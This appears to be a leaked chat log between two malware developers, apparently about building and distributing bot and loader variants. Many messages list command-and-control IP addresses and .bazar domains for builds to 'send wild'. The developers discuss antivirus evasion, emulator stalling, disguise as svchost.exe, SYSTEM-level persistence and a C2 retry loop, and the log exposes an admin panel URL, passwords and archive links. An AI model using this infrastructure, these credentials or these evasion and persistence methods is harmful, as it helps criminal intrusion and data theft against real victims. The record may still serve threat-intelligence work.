+87.120.254.97
+87.120.254.135
+87.120.8.168
+
+LOADER:
+87.120.254.135
+87.120.8.168
+87.120.254.243
+87.120.254.97
+
+second stage domains, bot and loeder:
+reddew28c.bazar
+bluehail.bazar
+whitestorm9p.bazar
+```
+[12/17/221 07:52:08] collin: send wild
+[12/17/21 08:42:15] geraldo: Hi!
+Copy
+[12/20/221 11:24:59] geraldo: Hi!
+There is a question here:
+The assignment says:
+```
+- DllEntryPoint is called first with the specification:
+BOOL WINAPI DllMain(HINSTANCE hinstDLL, DWORD fdwReason, LPVOID lpReserved)
+and fdwReason = DLL_PROCESS_ATTACH
+- If DllMain returns TRUE - then export-function is called with entry point, function specification:
+int __stdcall func(HWND hWnd, HINSTANCE hInst, LPWSTR lpszCmdLine, int nCmdShow);
+```
+This is from the image injection task.
+[12/20/221 11:25:22] geraldo: Header ``int __stdcall func(HWND hWnd, HINSTANCE hInst, LPWSTR lpszCmdLine, int nCmdShow);``
+[12/20/221 11:25:50] geraldo: This is a standard header of an exe-file.
+[20.12.21 11:27:02] geraldo: The exported functions have similar headers:
+`__declspec(dllexport) int __stdcall StartFunc()`
+[20.12.21 11:27:19] geraldo: Though they can be any.
+[20.12.21 11:28:12] geraldo: Is it supposed to be like that?
+[12/20-21 11:28:43] collin: Hi!
+[20.12.21 11:29:02] collin: yes the export function in the load will be with `__declspec(dllexport)` of course declared
+[20.12.21 11:29:29] collin: but it doesn't matter in the current context
+[20.12.21 11:29:45] collin: you look for the address of the required function, then you call it and pass the right number of parameters in the right sequence
+[20.12.21 11:30:33] geraldo: I understand that. But why are there four arguments?
+[20.12.21 11:30:34] collin: That is, the variable-function prototype only plays a role here
+[20.12.21 11:31:15] collin: this is a standard declaration for functions that are called with rundll32
+[20.12.21 11:32:00] collin: we don't actually pass parameters, it's how much data in the stack is allocated
+[20.12.21 11:32:32] collin: for correct processing and return from the function if you exit it by return instead of ExitThreads()/ExitProcess()
+[12/20-21 11:38:54] geraldo: I got it.
+Got it))) Thanks)
+[20.12.21 11:39:44] collin: in future you will probably have to pass some parameters, for example, hInst - with a base address of your image deployment
+[20.12.21 11:39:57] collin: this hasn't been stipulated yet, the practice will show
+[20.12.21 11:40:05] collin: now it will be enough to pass everything with zeroes
+[20.12.21 11:42:32] geraldo: I will pass hInst descriptor. It's not difficult.
+[20.12.21 11:45:19] collin: do the build
+[20.12.21 11:45:30] collin: group g4, x64, regsvr32
+[20.12.21 11:45:35] collin: ``
+first stage addresses (domains)
+bot:
+31.13.195.154
+31.13.195.140
+31.13.195.126
+87.120.8.117
+
+LOADER:
+87.120.8.117
+31.13.195.140
+31.13.195.154
+31.13.195.126
+
+second stage domains, bot and loeder:
+reddew28c.bazar
+bluehail.bazar
+whitestorm9p.bazar
+```
+[12/20-21 11:45:39] collin: send wild
+[20.12.21 11:46:04] geraldo: Copy that.
+[12/21/221 13:03:54] collin: Hi!
+[21.12.21 13:04:03] collin: build group g4
+[21.12.21 13:04:06] collin: x64, regsvr32
+[21.12.21 13:04:13] collin: ``
+addresses (domains) of the first stage
+bot:
+103.208.86.176
+103.208.86.177
+103.208.86.179
+103.208.86.182
+
+LOADER:
+103.208.86.179
+103.208.86.182
+103.208.86.176
+103.208.86.177
+
+second stage domains, bot and loeder:
+reddew28c.bazar
+bluehail.bazar
+whitestorm9p.bazar
+```
+[21.12.21 13:04:15] collin: send wild
+[12/21/221 13:09:21] geraldo: Hi, got it.
+[12/22/221 09:48:28] collin: Hi!
+[22.12.21 09:48:47] collin: 1) don't put 666 task for a long time, finish it soon
+[22.12.21 09:48:51] collin: 2) how do you get on 663?
+[12/22/221 09:53:20] collin: 663 is a percentage of readiness, how do you estimate how much time you still need for it?
+[12/22/221 10:26:50] geraldo: Hi!
+The 663 task is about 70 percent ready. I'm working on it now.
+[22.12.21 10:27:33] geraldo: I wanted to finish it before the New Year. At least to move it to the testing stage.
+[12/22/221 15:27:46] collin: Hi!
+[22.12.21 15:27:56] collin: Circumstances forced me to change BC refinement priority again.
+[22.12.21 15:28:31] collin: if you don't finish task 663 this week - put it on pause!
+[22.12.21 15:29:10] collin: and do 476 and 798 first
+[22.12.21 15:29:24] collin: pay attention in 476 I changed the wording of TOR
+[22.12.21 15:31:38] geraldo: Ok, I saw.
+[12/23/221 08:07:42] collin: Hi!
+[12/23/221 08:07:46] collin: build group g4
+[12/23/221 08:07:49] collin: x64, regsvr32
+[12/23/221 08:07:56] collin: ``
+addresses (domains) of the first stage
+bot:
+94.140.114.201
+176.103.58.142
+5.135.255.247
+192.119.93.26
+
+LOADER:
+5.135.255.247
+192.119.93.26
+94.140.114.201
+176.103.58.142
+
+second stage domains, bot and loeder:
+reddew28c.bazar
+bluehail.bazar
+whitestorm9p.bazar
+```
+[12/23/221 08:08:00] collin: send wild
+[12/23/221 08:09:40] geraldo: Hi!
+Copy
+[12/30/21 13:25:01] collin: Hi!
+[12/30/21 13:25:09] collin: tomorrow and next week no problems with BC
+take a rest or work a freelance schedule
+go to work as usual on january 10
+check your work chats every day since Jan. 4 if possible, for important messages
+[12/30/21/13:27:56] geraldo: Hi!
+Ok. I'll be in touch.
+[11.01.22 06:56:57] collin: Hi!
+[11.01.22 06:57:31] collin: on bugtracker:
+[11.01.22 06:57:41] collin: 1) write current status on tascas 480, 498
+[11.01.22 06:58:07] collin: 2) what is the status/work plan for tascas 798, 476?
+[11.01.22 07:20:15] geraldo: Hi!
+On the 498 task - Russian language in the loader in the debug messages is replaced by English everywhere, in the bot - not everywhere yet.
+[11.01.22 07:23:05] geraldo: I wanted to check some commands by the task 480 (11 3, for example).
+[11.01.22 07:25:23] geraldo: I have not got it for task 798 yet. If you run bot as a child process from browser, admin rights are not inherited. Browser's rights are inherited (middle process). How to fix it, is not clear.
+[11.01.22 07:28:39] geraldo: I have not started to solve task 476. To be more exact, I just looked through Internet, what information there is on this subject.
+[11.01.22 07:29:27] geraldo: In the task 476 you have to make BK work as a Windows service?
+[11.01.22 07:30:19] collin: as a service not necessary
+[11.01.22 07:30:59] collin: the main thing is correct operation and inheritance of rights
+[11.01.22 07:31:49] collin: so you'll have to run it with LOCAL SYSTEM rights and make sure everything works properly
+[11.01.22 07:32:01] collin: run - for example with scheduler task with "run by system" option
+[11.01.22 07:32:44] collin: royal recently checked it himself, you can consult him
+[11.01.22 07:33:07] collin: the BITS part is not complicated - you always inherit the rights for a task there, he wrote
+[11.01.22 07:34:55] collin: `If you run bot as a child process from browser, then administrator privileges are not inherited.
+[11.01.22 07:35:15] collin: 1) for this situation inject into another process, not browser
+[11.01.22 07:36:14] collin: 2) figure out how to start browser process in High integration, probably there is a solution. Also Royal did it, ask him if it worked
+[11.01.22 07:45:04] geraldo: Ok. I'll be in touch later. In a couple of hours.
+[11.01.22 08:01:32] collin: `I'm using a different process, the browser with admins rights looks pale.
+[11.01.22 08:02:36] collin: well, only through checking for the case if your process is High integration, if its without elevated privileges - then the masking strategy as before
+[11.01.22 11:35:03] geraldo: I wanted to clarify what I meant about searching for the command server.
+Now it's done like this:
+```
+for (r = 1; r <= 75; r++)
+{
+	if (r == 75)
+	{
+		End of process
+	}
+	for (i=0;i < 3; i++)
+	{
+		Passing through all the raw addresses;
+		pause for 1 minute
+		pass through all bazar addresses
+		1 minute pause
+	}
+	pass through all 128 DGA addresses
+	if r <> 1 make a half hour pause
+}
+```
+[11.01.22 11:35:25] geraldo: Can we leave it like that?
+[11.01.22 11:46:56] collin: ``Pass by all raw addresses`` - does one pass get one try here?
+[11.01.22 11:57:46] geraldo: Yes, one try to each ip-address
+[11.01.22 11:59:30] geraldo: But it is done in cycle of 3 iterations. So there are only 3 attempts to connect to each ip-address.
+[11.01.22 12:05:43] collin: leave it like that, it has to be modified in near future anyway
+[11.01.22 12:07:35] geraldo: Ok, thanks
+[13.01.22 10:41:22] collin: Hi!
+[13.01.22 10:41:23] collin: make an assembly
+[13.01.22 10:41:33] collin: g15, rundll32(freebm), x64
+[13.01.22 10:41:51] collin: ``
+first stage addresses (domains)
+bot:
+91.234.254.127
+5.255.96.16
+194.147.115.7
+84.32.188.182
+
+LOADER:
+194.147.115.7
+84.32.188.182
+91.234.254.127
+5.255.96.16
+
+second stage domains, bot and loeder:
+reddew28c.bazar
+bluehail.bazar
+whitestorm9p.bazar
+```
+[13.01.22 10:41:55] collin: send wild
+[13.01.22 10:46:42] geraldo: Hi! Got it!
+[14.01.22 13:08:13] geraldo: Hi! I'll be in touch around 18:00
+[17.01.22 11:51:04] collin: Hi!
+[17.01.22 11:51:07] collin: make an assembly
+[17.01.22 11:51:10] collin: g15 rundll32(vinc), x64
+[17.01.22 11:51:19] collin: ``
+addresses (domains) of the first stage
+bot:
+45.41.204.147
+103.208.86.105
+194.38.20.11
+5.181.80.177
+
+LOADER:
+194.38.20.11
+5.181.80.177
+45.41.204.147
+103.208.86.105
+
+second stage domains, bot and loeder:
+reddew28c.bazar
+bluehail.bazar
+whitestorm9p.bazar
+```
+[17.01.22 11:51:22] collin: send wild
+[17.01.22 11:54:30] geraldo: Hi!
+Checked out
+[17.01.22 11:54:59] collin: and also do build group 57
+[17.01.22 11:55:12] collin: rundll32(dopt), x64
+[17.01.22 11:55:16] collin: the addresses are different:
+[17.01.22 11:55:29] collin: ``
+addresses (domains) of the first stage
+bot:
+188.127.251.106
+194.147.115.132
+91.201.202.219
+194.38.20.30
+
+LOADER:
+91.201.202.219
+194.147.115.132
+194.38.20.30
+188.127.251.106
+
+second stage domains, bot and loeder:
+reddew28c.bazar
+bluehail.bazar
+whitestorm9p.bazar
+```
+[17.01.22 11:55:37] collin: send wild
+[17.01.22 11:55:44] geraldo: Copy
+[17.01.22 13:37:19] collin: how do you do, all give out?
+[17.01.22 13:37:37] geraldo: Yes, exactly)
+[18.01.22 08:02:22] collin: hi!
+[18.01.22 08:02:26] collin: how are you doing with the modifications?
+[18.01.22 08:05:32] geraldo: Hi!
+I'm working out privileges and fixing.
+[18.01.22 08:06:49] collin: any difficulties?
+[18.01.22 08:08:55] geraldo: I don't know yet. It seems restart with high privileges works if I don't inherit from browser.
+[18.01.22 08:09:57] collin: start with simple, don't use browser when working from system and in High Integration
+[18.01.22 08:25:50] collin: I put all the tasks that are not a priority at the moment into "Pending" status. Don't start working on new tasks until you close current ones.
+[18.01.22 08:26:16] geraldo: Ok
+[20.01.22 07:16:40] collin: hi!
+[20.01.22 07:16:45] collin: do build
+[20.01.22 07:17:06] collin: g15 rundll32(SwitchBasicMode), x64
+[20.01.22 07:17:11] geraldo: hi!
+[20.01.22 07:17:15] collin: ``
+addresses (domains) of the first stage
+bot:
+103.208.86.245
+188.127.251.111
+23.160.193.119
+80.71.158.22
+
+LOADER:
+23.160.193.119
+80.71.158.22
+103.208.86.245
+188.127.251.111
+
+second stage domains, bot and loeder:
+reddew28c.bazar
+bluehail.bazar
+whitestorm9p.bazar
+```
+[20.01.22 07:17:19] collin: send wild
+[20.01.22 07:17:22] geraldo: Copy
+[20.01.22 11:48:47] collin: make more x64 builds:
+[20.01.22 11:48:56] collin: group 23 rundll32(selectnode)
+group 23 generic
+[20.01.22 11:48:59] collin: the addresses and bazaars are the same
+[20.01.22 11:49:01] collin: send wild
+[20.01.22 11:49:24] geraldo: Copy.
+[21.01.22 13:08:20] geraldo: Hi, I'll be gone for a couple of hours. I'll be in touch after 18:00.
+[21.01.22 13:16:12] collin: hi ok
+[24.01.22 10:43:10] collin: hi!
+[24.01.22 10:43:19] collin: build group g15
+[24.01.22 10:43:20] collin: x64
+[24.01.22 10:43:26] collin: ``
+addresses (domains) of the first stage
+bot:
+87.120.8.179
+87.120.254.33
+87.120.37.114
+87.120.8.198
+
+LOADER:
+87.120.37.114
+87.120.8.198
+87.120.8.179
+87.120.254.33
+
+second stage domains, bot and loeder:
+reddew28c.bazar
+bluehail.bazar
+whitestorm9p.bazar
+```
+[24.01.22 10:43:31] collin: send wild
+[24.01.22 11:09:30] geraldo: Hi!
+Checked out
+[25.01.22 10:32:45] collin: hello!
+[25.01.22 10:32:50] collin: how are you doing on revisions?
+[25.01.22 10:36:33] geraldo: Hi!
+I made masking under svchost.exe on startup with elevated privileges. It's locked in system with high privileges too.
+[25.01.22 10:38:18] geraldo: I haven't found another folder for saving temporary files (as in the task) yet.
+[25.01.22 10:39:15] geraldo: I have static detection on Avira AV.
+Last week I think I finished it. But yesterday it appeared again.
+[25.01.22 10:40:26] geraldo: It does not exist for rundll32 and generic(exe) modes. But there is one in dll in generic mode.
+[26.01.22 11:48:55] collin: Hi!
+[26.01.22 11:49:03] collin: build x64 generic-glue for your test group
+[26.01.22 11:49:09] collin: ``
+addresses (domains) of the first stage
+bot:
+23.160.193.16
+23.160.193.38
+172.96.189.86
+194.40.243.76
+
+LOADER:
+194.40.243.76
+23.160.193.16
+23.160.193.38
+172.96.189.86
+
+second stage domains, bot and loeder:
+reddew28c.bazar
+bluehail.bazar
+whitestorm9p.bazar
+```
+[26.01.22 11:49:21] geraldo: Hi!
+[26.01.22 11:49:21] collin: direct biggie in this chat room
+[26.01.22 11:50:17] geraldo: what's your argument (/probe_no_soft)?
+[26.01.22 11:53:05] collin: give /test20220126
+[26.01.22 11:53:17] geraldo: Copy that.
+[26.01.22 13:34:44] geraldo: I sent assembly to Biggie.
+[26.01.22 13:35:14] collin: ok
+[31.01.22 07:28:19] collin: Hi!
+[31.01.22 07:28:22] collin: how did you make any progress with the revisions?
+[31.01.22 07:28:30] collin: tascas 476, 798
+[31.01.22 07:28:32] collin: ?
+[31.01.22 08:42:53] collin: ping
+[31.01.22 10:08:30] geraldo: Hi!
+[31.01.22 10:09:56] collin: Hi!
+[31.01.22 10:09:59] collin: make assemblies:
+[31.01.22 10:10:09] collin: g15 generic
+23 rundll32(setscreen)
+[31.01.22 10:10:11] collin: x64
+[31.01.22 10:10:31] collin: ``
+addresses (domains) of the first stage
+bot:
+185.14.31.205
+45.89.127.63
+104.168.48.120
+185.99.132.67
+
+LOADER:
+104.168.48.120
+185.99.132.67
+185.14.31.205
+45.89.127.63
+
+second stage domains, bot and loeder:
+reddew28c.bazar
+bluehail.bazar
+whitestorm9p.bazar
+```
+[31.01.22 10:10:35] collin: send wild
+[31.01.22 10:11:13] geraldo: On task 476 fixing and working with high privileges is done. Target folders just haven't changed yet.
+[31.01.22 10:12:26] geraldo: I was fiddling with detects a lot last week. Avira AV is making trouble.
+[31.01.22 10:13:01] collin: are there any detects left now?
+[31.01.22 10:13:15] collin: builds anyway, even if there are detections
+[31.01.22 10:13:38] geraldo: I will check it now.
+[31.01.22 11:04:55] geraldo: I sent the builds.
+64-bit dll-files are clean on dyncheck.
+[31.01.22 11:05:53] collin: ok.
+[31.01.22 13:33:29] geraldo: I'll be in touch after 18:00
+[01.02.22 10:43:13] collin: ``
+Hi!
+Need to organize communication on the Tox network. Now as a backup channel, in the future perhaps it will become the main one.
+1. Download and install Tox network client (e.g. qTox). Create a new profile for your work account, if you haven't already. Write in your profile a nickname AS IN THIS ROCKET. And send me your Tox ID.
+2. In the client settings, make sure the connection is through the Tor network.
+3. Add to my contacts, my ID: 8201462924F7963A54ABADC532504AED61F6D60DFFF2B2BE2FC63D2D41A3FF73C1C6136DFD244
+Deadline - by the end of this week
+confirm
+```
+[01.02.22 10:45:14] geraldo: Hi!
+Checked out
+[02.02.22 11:36:30] geraldo: Hi!
+This is my Tox ID:
+```
+3E1351ECBCC58A0866AA1947AAF94C0A83DA744E57B83952863439851375B809BF64BA1548EE
+```
+[02.02.22 11:38:17] collin: +
+[03.02.22 10:25:02] collin: Hi!
+[03.02.22 10:25:06] collin: ``https://privnote.com/A31Jric2#S48FnpG8Z``
+[03.02.22 10:25:10] collin: confirm receipt and transcript
+[02.03.22 22 10:53:44] geraldo: Hello! I can't find my login and password!
+[03.02.22 10:53:56] geraldo: From test admin
+[03.02.22 10:55:11] collin: ``
+b8
+Cd6ND7k%Nd7jEN3J%Nd
+```
+[03.02.22 10:55:15] collin: ``credits from the test one
+[03.02.22 10:55:22] collin: `https://217.12.204.65/sOIDFhsAIUfhu42332uygt27634ft7yuaFGyaugkJFsayjegf--_-GBASfdvt23fv/`
+[03.02.22 10:57:18] geraldo: Thank you.
+[03/22/222 11:09:38] geraldo: Well, I have not reproduced the problem on the test admin. The bots moved normally to another section.
+But I had this problem before too. Could not transfer my bots to test
+[03 Feb 22 11:10:59] geraldo: Browser version:
+11.0.4 (based on Mozilla Firefox 91.5.0esr) (64 bit)
+[03.02.22 11:12:18] collin: +
+[03.02.22 15:42:42] collin: ``
+https://privatlab.com/s/v/6GyVlM6EW5s2YbL9Gw3O
+
+information security memo (.gpg file)
+Read it, put it to work
+```
+[03.02.22 15:48:01] geraldo: I got it.
+[07.02.22 10:23:40] collin: hello!
+[07.02.22 10:23:45] collin: how do you get on with the rework?
+[07.02.22 10:27:15] geraldo: Hi!
+No changes so far. Changing the target folder when saving the temporary files is not done yet (when working with high privileges). High priority locking seems to work fine.
+[07.02.22 10:27:48] collin: what is the difficulty and hiccup?
+[07.02.22 10:27:57] collin: you've been fiddling with these shuffles for a very long time already
+[07.02.22 10:29:22] geraldo: There is no difficulty. I will do it soon.
+[07.02.22 10:29:46] collin: send me free form report
+[07.02.22 10:29:52] collin: what did you do last week
+[07.02.22 10:30:10] collin: today by the end of the day
+[07.02.22 10:31:27] collin: also update task list in redmain - each with status "in progress" + 798 + 476 - add current level of readiness, time already spent on task, how much time left
+[07.02.22 10:31:48] collin: also update the project in the git including RELEASE_NOTES* files
+[07.02.22 10:31:58] collin: I need to understand why it takes so long
+[07.02.22 10:32:33] collin: I purposely didn't give you a whole week of builds in the hope that the tacos would move, no vision node...
+[07.02.22 12:45:39] geraldo: Last week I fixed the loader. I had to look in debugger to eliminate detector, what other references to data segments were left and remove them. I uploaded everything I made to gitlab last week. I also made some functions to loop when run by emulator, and wrote a separate subroutine to unlock looping.
+[07.02.22 12:46:23] geraldo: I don't know if it helps or not, but I don't know what to do against detects anymore
+[07.02.22 12:46:45] collin: what detects are you fighting?
+[07.02.22 12:54:10] geraldo: After last fixing the loader in the 64-bit version there are no detects yet. I just checked it, it is clean so far.
+[07.02.22 12:54:43] geraldo: In 32-bit only black-black all on dincheck
+[07.02.22 12:56:49] collin: 32, you don't need it yet
+[07.02.22 12:57:02] collin: we are planning to give up 32 completely, only 64 onwards
+[07.02.22 13:32:19] geraldo: Now I tested working with high privileges. I copied it to %programdata% folder, saved temporary files to Temp folder.
+Latching works fine.
+[07.02.22 13:32:56] geraldo: I put last two tasks to "testing" status
+[07.02.22 13:43:41] collin: +
+[08.02.22 13:39:52] collin: Hello!
+[08.02.22 13:40:10] collin: added task 851, it's the most urgent, do it first
+[08.02.22 13:40:12] collin: ``
+C8m%Ndk4na&KD#&Kfdmr9l)Dney
+https://privatlab.com/s/v/r7DJe66WW2tjokBDgZpj
+```
+[08.02.22 13:40:15] collin: ``Materials for the shuffle
+[08.02.22 13:40:18] collin: acknowledge receipt
+[08.02.22 14:02:56] geraldo: Hi!
+Received
+[10.02.22 09:15:59] collin: Hi!
+[10.02.22 09:16:19] collin: added two shuffles to redmine 854 and 860
+[10.02.22 09:16:33] collin: also urgent - when you're done with 851, start making them
+[10.02.22 09:17:23] geraldo: Hi!
+Copy
+[11.02.22 14:35:51] collin: hi!
+[11.02.22 14:36:04] collin: corrected task 860 - should add domain parameter - in flag 1 "General Info", pay attention
+[11.02.22 14:36:51] geraldo: Hi!
+[14.02.22 08:42:25] collin: hi!
+[14.02.22 08:42:32] collin: build group g15
+[14.02.22 08:42:51] collin: rundll32(assaic)
+[14.02.22 08:42:58] collin: ``
+addresses (domains) of the first stage
+bot:
+45.128.149.42
+137.74.104.103
+5.2.67.108
+80.92.204.176
+
+LOADER:
+5.2.67.108
+80.92.204.176
+45.128.149.42
+137.74.104.103
+
+second stage domains, bot and loeder:
+reddew28c.bazar
+bluehail.bazar
+whitestorm9p.bazar
+```
+[14.02.22 08:43:01] collin: send wild
+[14.02.22 08:43:07] geraldo: Hi!
+Checked out
+[14.02.22 08:44:43] collin: duplicate this build also odis
+[14.02.22 08:44:59] geraldo: Ok
+[02/15/222 11:50:23] geraldo: Hi!
+Are we going to do builds now? I wanted to go out till the evening.
+[02/15/222 11:52:41] collin: Hi!
+[15.02.22 11:52:54] collin: no response so far.
+[15.02.22 11:52:58] collin: no orders
+[15.02.22 11:53:04] collin: Go away
+[02/15/222 11:53:25] geraldo: Thank you. I'll be in touch after 18:00.
+[15.02.22 11:53:34] collin: +
+[02/15/222 16:00:20] collin: ``
+X6ndHN(K4nDJ%Nd7kFN5k8Beg
+https://privatlab.com/s/v/EJWr4Ny280Iwxd2AB5Z5
+https://privatlab.com/s/d/EJWr4Ny280Iwxd2AB5Z5/qjjMg#delete
+```
+[15.02.22 16:00:34] collin: found a problem with your build, it does not work correctly on win7
+[15.02.22 16:00:37] collin: these are startup logs
+[15.02.22 16:00:56] collin: added task 872 - need it fixed ASAP
+[15.02.22 16:01:02] collin: acknowledge receipt of file and task
+[15.02.22 16:11:28] geraldo: Got it. I'll take a look.
+Judging by the logs, the bot is running. He did not knock?
+[15.02.22 16:12:00] collin: eventually knocked but more than half an hour at working addresses, such
+[02/15/222 16:12:38] collin: the other day royal fixed the problem with requests on 7 and 8 win, he had a problem with additional headers in wininet
+[15.02.22 16:12:51] collin: maybe you have similar situation
+[15.02.22 16:16:31] geraldo: Ok
+[02/17/222 09:28:47] collin: hi!
+[17.02.22 09:28:50] collin: do the build
+[17.02.22 09:29:02] collin: g15 rundll32(CompleteStateA)
+[17.02.22 09:29:12] collin: with autocapture with autocapture mode
+[17.02.22 09:29:40] collin: ``
+addresses (domains) of the first stage
+bot:
+185.219.220.123
+185.158.248.240
+194.76.224.142
+185.158.249.150
+
+LOADER:
+194.76.224.142
+185.158.248.240
+185.219.220.123
+185.158.249.150
+
+second stage domains, bot and loeder:
+reddew28c.bazar
+bluehail.bazar
+whitestorm9p.bazar
+```
+[17.02.22 09:29:45] collin: send wild
+[17.02.22 09:31:19] geraldo: Hi! Got it!
+[17.02.22 12:50:45] collin: make another build of soc1 group
+[17.02.22 12:50:48] collin: rundll32(bscvla)
+[17.02.22 12:51:06] collin: ``
+addresses (domains) of the first stage
+bot:
+185.150.117.116
+172.96.188.72
+45.131.66.226
+23.160.193.137
+
+LOADER:
+45.131.66.226
+23.160.193.137
+185.150.117.116
+172.96.188.72
+
+second stage domains, bot and loeder:
+reddew28c.bazar
+bluehail.bazar
+whitestorm9p.bazar
+```
+[17.02.22 12:51:10] collin: send wild
+[17.02.22 13:42:26] geraldo: Copy
+[21.02.22 09:49:44] geraldo: Hello!
+On the tasks:
+1. I have checked the specifications of the entry points.
+2. I have changed the 1 SystemInfo command, but haven't tested it yet. In the admin panel, I did not find a field where flags should be set. I guess I don't have it yet.
+[21.02.22 09:50:23] collin: it's on 65 - it's not done there yet, but you can set flags in builder commands
+[21.02.22 09:52:28] geraldo: I checked it on Windows 7. All the builds I did last week I checked on the VM that was redelivered.
+Everything worked fine (no long delays).
+[21.02.22 09:52:49] collin: got it, let's check it again.
+[21.02.22 09:53:27] collin: build group 40 generic
+[21.02.22 09:53:36] collin: ``
+addresses (domains) of the first stage
+bot:
+103.208.86.141
+188.127.231.76
+45.41.204.10
+5.252.177.62
+
+LOADER:
+45.41.204.10
+5.252.177.62
+103.208.86.141
+188.127.231.76
+
+second stage domains, bot and loeder:
+(no)
+```
+[21.02.22 09:53:40] collin: direct me
+[21.02.22 09:54:04] collin: I'm changing the priority on the tascas again) 854 - not urgent yet
+[21.02.22 09:55:22] collin: first do 596, then do 583 (noise requests in loader) - you will need it for next protocol
+[21.02.22 09:56:34] geraldo: Copy that
+[21.02.22 10:46:19] geraldo: Done!
+```
+https://privatlab.com/s/v/9mo6nLm9pAuwgpBRO2q9
+https://privatlab.com/s/d/9mo6nLm9pAuwgpBRO2q9/7roR4#delete
+```
+[21.02.22 10:49:53] collin: +
+[21.02.22 10:51:07] collin: on wednesday 23 february needs your presence and readiness to collect the uk
+[21.02.22 10:51:18] collin: afternoon from 11 to 17 msk
+[21.02.22 10:51:34] collin: can you?
+[21.02.22 10:51:39] geraldo: Okay. Yes, I can.
+[21.02.22 10:51:42] collin: okay.
+[21.02.22 15:13:55] geraldo: uploaded all last changes on gitlab
+[21.02.22 15:26:06] collin: -----BEGIN PGP MESSAGE-----
+
+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
